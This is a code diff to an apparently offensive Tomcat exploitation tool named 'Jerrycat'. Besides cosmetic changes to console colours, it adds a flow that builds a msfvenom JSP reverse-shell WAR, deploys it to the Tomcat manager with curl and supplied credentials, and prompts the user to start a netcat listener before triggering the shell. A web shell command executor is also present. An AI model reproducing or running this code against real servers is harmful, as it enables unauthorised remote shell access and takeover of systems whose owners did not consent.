@@ -100,18 +100,22 @@ class output_class:
         match state:
             case "credit":
                 text.append(f"[+] ", style="pale_turquoise1")
+            case "settings":
+                text.append("[")
+                text.append("SETTINGS", style="turquoise2")
+                text.append("] ")
             case "info":
                 text.append("[")
                 text.append("INFO", style="yellow")
                 text.append("] ")
             case "success":
-                text.append(f"[+] ", style="bright_green")
+                text.append(f"[+] ", style="spring_green2")
             case "failed":
                 text.append(f"[-] ", style="red1")
             case "error":
                 text.append(f"[!] ", style="orange_red1")
             case "ongoing":
-                text.append(f"[*] ", style="dodger_blue2")
+                text.append(f"[*] ", style="turquoise2")
             case "exit":
                 text.append("[")
                 text.append("EXITING", style="red1")
@@ -234,20 +238,38 @@ class authenticated_attack(tomcat):
 
                 response = requests.get(url=f"{self.url}/reverse_shell/index.jsp")
 
-                output.message(state="info", description=f"LPORT: {args.lport}", clear_before=False)
-                output.message(state="info", description=f"LHOST: {args.lhost}", clear_before=False)
+                output.message(state="settings", description=f"LHOST: {args.lhost} - LPORT: {args.lport}", clear_before=False)
 
                 if response.status_code != 200:
 
                     if os.path.exists(f"reverse/{filename}.war"):
                         os.remove(f"reverse/{filename}.war")
 
-                    subprocess.run(["msfvenom", "-p", "java/jsp_shell_reverse_tcp", f"LHOST={args.lhost}", f"LPORT={args.lport}", "-f", "war", "-o", f"{filename}.war"], check=True, capture_output=True)
+                    subprocess.run(
+                        ["msfvenom", "-p", "java/jsp_shell_reverse_tcp", f"LHOST={args.lhost}", f"LPORT={args.lport}",
+                         "-f", "war", "-o", f"{filename}.war"], check=True, capture_output=True)
 
                     command = f'curl --upload-file {filename}.war -u "{self.username}:{self.password}" "{self.url}manager/text/deploy?path=/{filename}"'
                     subprocess.run(command, shell=True, check=True, capture_output=True)
+                    output.message(state="success", description="Uploading revershell", clear_before=False)
 
-                    requests.get(url=f"{self.url}{filename}/")
+                    output.message(state="info", description=f"Run this cmd : nc -nlvp {args.lport}",
+                                   clear_before=False)
+
+                    print("[bold red]Jerrycat[/] > Type [bold yellow]'Run'[/] when your netcat is ready")
+                    print("[bold red]Jerrycat[/] > ", end="")
+                    is_netcat_ready = input()
+
+                    while is_netcat_ready.lower() != "run":
+                        print("[bold red]Jerrycat[/] > ", end="")
+                        is_netcat_ready = input()
+
+                    output.message(state="success", description="Send revershell", clear_before=False)
+                    response = requests.get(url=f"{self.url}{filename}/")
+                    if response.status_code == 200:
+                        output.message(state="exit", description="See you next time!", clear_before=False)
+                    else:
+                        output.message(state="error", description=f"Oups.. seems we have an error {response.status_code} here", clear_before=False)
 
     def execute_webshell_cmd(self, cmd: str):
         response = requests.get(f"{self.url}/web_shell/index.jsp?cmd={cmd}")
